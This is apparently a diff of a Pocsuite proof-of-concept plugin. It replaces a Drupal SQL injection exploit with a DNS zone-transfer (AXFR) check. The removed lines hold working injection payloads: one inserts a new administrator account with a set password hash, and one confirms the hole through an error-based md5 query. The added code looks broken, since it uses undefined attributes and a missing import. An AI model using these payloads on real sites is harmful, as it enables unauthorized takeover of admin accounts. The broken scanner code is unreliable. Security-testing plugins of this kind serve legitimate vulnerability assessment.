@@ -3,7 +3,7 @@
 from pocsuite.api.request import req  # 用法和 requests 完全相同
 from pocsuite.api.poc import register
 from pocsuite.api.poc import Output, POCBase
-import socker
+import socket
 from dns import resolver, query, exception
 
 
@@ -32,50 +32,28 @@ class DNS_transforPoc(POCBase):
     install_requires = [ 'socket', 'dnspython']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
 
     def _attack(self):
+        vul_url = self.url
         result = {}
-        vul_url = '%s/?q=node&destination=node' % self.url
-        uid = int(random.random() * 1000)
-        username = ''.join(random.sample(string.letters+string.digits, 5))
-        payload = OrderedDict()
-
-        if not self._verify(verify=False):
-            return self.parse_attack(result)
-
-        payload['name[0;insert into users(uid, name, pass, status, data) values (%d, \'%s\', ' \
-                '\'$S$DkIkdKLIvRK0iVHm99X7B/M8QC17E1Tp/kMOd1Ie8V/PgWjtAZld\', 1, \'{b:0;}\');' \
-                'insert into users_roles(uid, rid) values (%d, 3);#]' % (uid, username, uid)] \
-                 = 'test'
-        payload['name[0]'] = 'test2'
-        payload['pass'] = 'test'
-        payload['form_id'] = 'user_login_block'
-
-        #print urllib.urlencode(payload)
-        response = req.post(vul_url, data=payload)
-        if response.status_code == 200:
-            result['AdminInfo'] = {}
-            result['AdminInfo']['Username'] = username
-            result['AdminInfo']['Password'] = 'thanks'
-
+        nss = resolver.query(vul_url, 'NS')
+        nameservers = [ str(ns) for ns in nss ]
+        for ns in self.nameservers:
+            z = self.query(ns)
+            if z!=None:
+                result['domain'] =  vul_url
+                result['ns'] = ns
         return self.parse_attack(result)
 
+
     def _verify(self, verify=True):
+        vul_url = self.url
         result = {}
-        vul_url = '%s/?q=node&destination=node' % self.url
-        payload = {
-            'name[0 and (select 1 from (select count(*),concat((select md5(715890248' \
-                '135)),floor(rand(0)*2))x from  information_schema.tables group by x' \
-                ')a);;#]': 'test',
-            'name[0]': 'test2',
-            'pass': 'test',
-            'form_id': 'user_login_block',
-        }
-
-        response = req.post(vul_url, data=payload).content
-        if 'e4f5fd37a92eb41ba575c81bf0d31591' in response:
-            result['VerifyInfo'] = {}
-            result['VerifyInfo']['URL'] = self.url
-            result['VerifyInfo']['Payload'] = urllib.urlencode(payload)
-
+        nss = resolver.query(vul_url, 'NS')
+        nameservers = [ str(ns) for ns in nss ]
+        for ns in self.nameservers:
+            z = self.query(ns)
+            if z!=None:
+                result['domain'] =  vul_url
+                result['ns'] = ns
         return self.parse_attack(result)
 
     def parse_attack(self, result):
@@ -85,5 +63,32 @@ class DNS_transforPoc(POCBase):
         else:
             output.fail('Internet nothing returned')
         return output
+
+    def query(self, ns):
+        nsaddr = self.resolve_a(ns)
+        try:
+            z = self.pull_zone(nsaddr)
+        except (exception.FormError, socket.error, EOFError):
+            print >> sys.stderr, "AXFR failed\n"
+            return None
+        else:
+            return z
+
+
+    def resolve_a(self, name):
+        """Pulls down an A record for a name"""
+        nsres = resolver.query(name, 'A')
+        return str(nsres[0])
+
+
+    def pull_zone(self, nameserver):
+        """Sends the domain transfer request"""
+        q = query.xfr(nameserver, self.domain, relativize=False, timeout=2)
+        zone = ""
+        for m in q:
+            zone += str(m)
+        if not zone:
+            raise EOFError
+        return zone
 
 register(DNS_transforPoc)
